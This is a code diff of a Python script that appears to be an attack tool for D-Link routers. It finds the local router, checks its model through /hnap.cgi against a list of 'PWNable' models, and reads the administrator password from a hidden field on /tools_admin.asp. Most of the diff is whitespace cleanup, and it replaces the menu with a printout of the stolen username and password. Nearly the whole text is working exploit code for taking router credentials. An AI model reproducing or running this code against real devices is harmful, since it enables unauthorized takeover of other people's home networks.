@@ -65,37 +65,37 @@ def getRouterIP() -> str:
 def getRouterType(ip: str) -> str:
     """ Parse router configuration page to check router type """
 
-    try: 
+    try:
         response = requests.get("http://" + ip + "/hnap.cgi").text
     except:
         return ""
-    
+
     # Use RE to parse router name from login page
     title = str(re.search("<ModelName>\"(.*)\"<\/ModelName>", response).group(1))
-    
+
     # Check for old-style title
     # if title == "D-LINK CORPORATION, INC | WIRELESS ROUTER | HOME":
     #     return "DIR-628"
 
     # if " " in title:
     #     return None
-    
+
     return title
 
 
 def isSupported(router_str: str) -> bool:
     """ Check if a router string is supported by this attack """
 
-
     # Return if router string is in the first element of each tuple of routers
-    return str(router_str) in routers.keys() 
+    return str(router_str) in routers.keys()
 
 
 def getPassword(ip: str, attack_type: int) -> str:
     """ Parses the router configuration for admin password """
     data = requests.get("http://" + ip + "/tools_admin.asp/").text
-    
-    password = str(re.search('<input type="hidden" id="user_password_tmp" name="user_password_tmp" value="(.*)">', data).group(1))
+
+    password = str(re.search(
+        '<input type="hidden" id="user_password_tmp" name="user_password_tmp" value="(.*)">', data).group(1))
     return password
 
 
@@ -115,6 +115,7 @@ def executeMenuSelection():
     # Execute selection
     if selection in menu:
         menu[selection]["function"]()
+
 
 def spawnShell():
     # TODO: make this auto-login
@@ -151,7 +152,7 @@ def main():
     print(ASCII.Red + banner)
 
     # Check for router dns
-    print(ASCII.Reset + "   [ ] Search for router via DNS...", end="\r")
+    print(ASCII.Reset + "    [ ] Search for router via DNS...", end="\r")
 
     # Try to get IP addr
     try:
@@ -162,25 +163,25 @@ def main():
     # Check if our previous check was successful
     if router.ip != "":
         status_str = ASCII.Green + \
-            "   [*] " if router.model != "" else ASCII.Yellow + "   [ ] "
-        print(ASCII.Green + "   [*] " + ASCII.Reset +
+            "    [*] " if router.model != "" else ASCII.Yellow + "    [ ] "
+        print(ASCII.Green + "    [*] " + ASCII.Reset +
               "Found router ip via DNS         ")
     else:
         # Check for router IP
         router.ip = getRouterIP()
-        print(ASCII.Green + "   [*] " + ASCII.Reset +
+        print(ASCII.Green + "    [*] " + ASCII.Reset +
               "Found router ip via gateway (" + router.ip + ")     ")
 
     # Check router type
     router.model = getRouterType(router.ip)
     status_str = ASCII.Green + \
-        "   [*] " if router.model != "" else ASCII.Yellow + "   [ ] "
+        "    [*] " if router.model != "" else ASCII.Yellow + "   [ ] "
     print(status_str + ASCII.Reset + "Check router type")
 
     # Check if oruter is PWNable
     is_pwnable = isSupported(router.model)
     status_str = ASCII.Green + \
-        "   [*] " if is_pwnable else ASCII.Yellow + "   [ ] "
+        "    [*] " if is_pwnable else ASCII.Yellow + "   [ ] "
     print(status_str + ASCII.Reset + "Check router support")
 
     # exit if router is not supported
@@ -191,15 +192,13 @@ def main():
     # Check for password
     router.password = getPassword(router.ip, routers[str(router.model)])
 
-    # Display the menu
-    displayMenu()
-
-    try:
-        while True:
-            executeMenuSelection()
-    except KeyboardInterrupt:
-        print("Closing.. Goodbye!")
-        exit()
+    # Display the creds
+    print(ASCII.Green + "    [*] " + ASCII.Reset + "Acquire creds")
+    print(ASCII.Green + "    [*] " + ASCII.Reset + "Parse username")
+    print(ASCII.Green + "    [*] " + ASCII.Reset + "Parse password")
+    print()
+    print(ASCII.Green + "    - " + ASCII.Reset + "Username: admin")
+    print(ASCII.Green + "    - " + ASCII.Reset + "Password: " + router.password)
 
 
 # Do the python thingy
